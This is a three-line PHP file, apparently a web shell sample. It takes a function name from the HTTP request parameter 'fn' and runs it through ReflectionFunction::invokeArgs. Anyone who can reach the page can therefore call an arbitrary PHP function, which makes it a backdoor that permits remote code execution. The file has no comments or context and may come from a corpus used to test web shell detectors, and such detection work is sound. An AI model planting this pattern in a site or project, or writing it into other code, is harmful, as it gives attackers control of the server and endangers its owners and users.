<?php
$fn = new ReflectionFunction($_REQUEST["fn"]);
$fn->invokeArgs(array("constant"));
